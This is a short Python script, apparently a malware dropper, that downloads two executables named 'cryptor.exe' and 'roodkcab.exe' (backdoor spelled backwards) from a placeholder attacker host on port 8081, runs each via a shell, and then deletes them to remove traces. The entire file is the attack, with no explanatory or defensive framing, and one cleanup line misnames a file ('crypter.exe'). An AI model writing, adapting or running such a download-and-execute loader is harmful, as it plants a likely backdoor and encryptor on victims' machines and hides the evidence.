#!/usr/bin/env python
import subprocess, os, requests, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



#temp_directory = tempfile.gettempdir()
#os.chdir(temp_directory)

download("http://IP ADDRESS:8081/files/cryptor.exe")
subprocess.Popen("cryptor.exe", shell=True)

download("http://IP ADDRESS:8081/files/roodkcab.exe")
subprocess.call("roodkcab.exe", shell=True)

os.remove("roodkcab.exe")
os.remove("crypter.exe")
